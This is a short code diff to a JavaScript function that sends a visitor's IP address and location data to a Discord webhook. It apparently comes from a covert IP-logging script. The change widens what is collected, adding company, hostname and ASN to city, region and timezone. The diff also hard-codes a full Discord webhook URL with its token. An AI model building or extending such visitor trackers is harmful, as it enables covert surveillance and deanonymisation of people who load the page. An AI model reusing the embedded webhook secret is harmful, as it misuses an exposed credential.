@@ -24,7 +24,7 @@
 
   // Function to send data to Discord webhook as an embedded message
   async function sendToDiscord(ipAddress, locationInfo) {
-    const { city, region, timezone } = locationInfo;
+    const { city, region, timezone, company, hostname, asn } = locationInfo;
     const webhookURL = 'https://discord.com/api/webhooks/1197319022455300147/hnBvBYUy-eHX9vSz8S_-jMFtQ805c7pUcoQqkLB6ZSCzE_h87CHjMPrMy6aqNXFdT_P7'; // Replace with your Discord webhook URL
 
     // Convert RGB color (49, 51, 56) to Discord format
@@ -39,6 +39,9 @@
                 { name: "City", value: city },
                 { name: "Region", value: region },
                 { name: "Timezone", value: timezone },
+                { name: "Company", value: company },
+                { name: "Hostname", value: hostname },
+                { name: "ASN", value: asn },
             ],
         }],
     };
